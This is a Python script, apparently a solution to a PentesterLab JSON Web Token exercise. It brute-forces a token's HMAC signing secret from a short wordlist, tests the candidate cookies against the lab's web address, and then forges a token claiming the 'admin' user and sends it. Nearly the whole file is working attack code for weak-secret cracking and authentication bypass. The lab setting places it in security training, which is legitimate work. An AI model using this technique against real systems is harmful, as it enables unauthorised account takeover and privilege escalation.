#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM
#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.e3VzZXI6YWRtaW59Cg.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM

import urllib.request
import base64
import hmac, hashlib

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
header, payload, sign = token.split(".")

words = "hacker:jwt:insecurity:pentesterlab:hacking"
word_list = words.split(':')
print(word_list)

def get_data(word_list):
    data = '{"user":null}'
    cookies = []
    for secret in word_list:
        data = header +"." + payload
        signature = base64.urlsafe_b64encode(hmac.new(bytes(secret, encoding="utf8"), data.encode('utf-8'), hashlib.sha256).digest()).decode("utf8").rstrip("=")
        print(data + "." + signature)
        if signature == sign:
            print(secret)
        cookies.append((data + "." + signature, secret))
    return cookies# cookies = [["sing", "secret"],[],...] 

       
def send_cookie(cookies):
    cookie = {"Cookie": "auth=cookie"}
    url ="http://ptl-b78ab3a9-4ccd6cd1.libcurl.so/"
    
    for i in cookies:
        cookie["Cookie"] = "auth=cookie".replace("cookie", i[0])
        print("Trying - ", i[1]," ",  cookie)
        try:
            request=urllib.request.Request(url, headers=cookie)
            response=urllib.request.urlopen(request)
            SECRET = i[1]
            return SECRET
        except urllib.error.HTTPError:
            print("Error 500")


def get_key(secret):
    data = '{"user":"admin"}'
    payload = base64.urlsafe_b64encode(bytes(data, encoding="utf8")).decode("utf-8").rstrip("=")
    print("this is payload ",payload)
    #payload = "eyJ1c2VyIjoiYWRtaW4ifQo"
    data = header +"." + payload
    signature = base64.urlsafe_b64encode(hmac.new(bytes(secret, encoding="utf8"), data.encode('utf-8'), hashlib.sha256).digest()).decode("utf8").rstrip("=")
    return data+"."+signature


def send(cookies):
    cookie = {"Cookie": "auth=cookie"}
    url ="http://ptl-b78ab3a9-4ccd6cd1.libcurl.so/"
    cookie["Cookie"] = "auth=cookie".replace("cookie", cookies)
    print("Trying - ", cookies)
    try:
        request=urllib.request.Request(url, headers=cookie)
        response=urllib.request.urlopen(request)
        print(response.read())
    except:
        print("Error")

cookies = get_data(word_list)
SECRET = send_cookie(cookies)
print(SECRET)
true_cookie = get_key(SECRET.rstrip("\\n").rstrip("\\r"))
print(true_cookie)
send(true_cookie)
